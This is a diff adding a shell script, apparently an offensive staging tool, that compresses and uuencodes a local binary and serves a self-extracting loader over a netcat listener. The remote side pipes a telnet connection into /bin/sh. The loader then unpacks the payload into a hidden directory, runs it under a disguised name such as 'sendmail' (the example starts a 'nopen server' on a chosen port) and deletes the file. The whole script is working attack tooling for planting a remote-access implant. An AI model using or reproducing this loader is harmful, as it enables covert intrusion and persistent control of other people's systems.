@@ -1,0 +1,80 @@
+#!/bin/sh
+
+if [ "${#}" -lt "4" ]
+then
+  echo ""
+  echo "Local Usage: ${0} [-v] file locport directory name [\"args1\" [\"args2\"] ]"
+  echo ""
+  echo "  -v = verbose output"
+  echo "  file = local file to upload (not zipped or uuencoded)"
+  echo "  locport = local listening port"
+  echo "  directory = directory name on remote system"
+  echo "  name = name of file on remote system"
+  echo "  \"args1\" (optional) = env vars given prior to remfile when run"
+  echo "  \"args2\" (optional) = args given after remfile when run"
+  echo ""
+  echo "Example:"
+  echo "      ${0} noserver 32177 /tmp/.X11-lock/0 sendmail 'C=\"-l 11111\"'"
+  echo "  will run nopen server on port 11111"
+  echo ""
+  echo "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh"
+  echo ""
+  exit 1
+fi
+
+if [ "${1}" = "-v" ]
+then
+  VERBOSE=1
+  shift
+fi
+
+FILE=${1}
+PORT=${2}
+DIR=${3}
+NAME=${4}
+ARGS1=${5}
+ARGS2=${6}
+
+cp ${FILE} ${NAME}
+compress -f ${NAME}
+uuencode ${NAME}.Z ${NAME}.Z > ${NAME}.uu
+
+cat << NCEND > /tmp/ratload.tmp.sh
+PATH="/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd"
+TERM=vt100
+export PATH TERM
+mkdir -p ${DIR}
+cd ${DIR} && sed 's/^X//' << 'EOF' | uudecode &&
+`cat ${NAME}.uu`
+EOF
+uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}
+NCEND
+
+if [ ! -z ${VERBOSE} ]
+then
+  cat << EOF
+cp ${FILE} ${NAME}
+compress -f ${NAME}
+uuencode ${NAME}.Z ${NAME}.Z > ${NAME}.uu
+EOF
+  echo "+++++++++++++++++++++++++"
+  echo "+         BEGIN         +"
+  echo "+ /tmp/ratload.tmp.sh   +"
+  echo "+ (sans uuencoded data) +"
+  echo "+++++++++++++++++++++++++"
+  grep -v "^M" /tmp/ratload.tmp.sh
+  echo "+++++++++++++++++++++++++"
+  echo "+          END          +"
+  echo "+ /tmp/ratload.tmp.sh   +"
+  echo "+ (sans uuencoded data) +"
+  echo "+++++++++++++++++++++++++"
+  echo "Running: cat /tmp/ratload.tmp.sh | nc -l -p ${PORT}"
+fi
+
+echo ""
+echo "Bytes: `ls -l ${NAME}.uu | awk '{print $5}'`"
+
+(sleep 1; echo "Listening on port ${PORT}") &
+
+cat /tmp/ratload.tmp.sh | nc -l -p ${PORT}
+
